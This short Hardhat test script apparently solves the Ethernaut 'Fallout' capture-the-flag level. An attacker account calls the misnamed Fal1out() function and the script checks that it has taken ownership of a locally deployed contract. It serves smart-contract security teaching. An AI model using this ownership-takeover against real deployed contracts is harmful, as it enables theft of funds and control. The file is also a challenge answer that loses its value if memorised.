import { expect } from "chai";
import { ethers } from "hardhat";

describe("Fallout", async function () {

  it("Should claim ownership ", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const Fallout = await ethers.getContractFactory("Fallout");
    const fallout = await Fallout.deploy();
    await fallout.deployed();
    //setup-

    //1.Call Fal1out function to claim ownership
    await fallout.connect(attacker).Fal1out()

    expect(await fallout.owner()).to.eq(attacker.address)

  });
});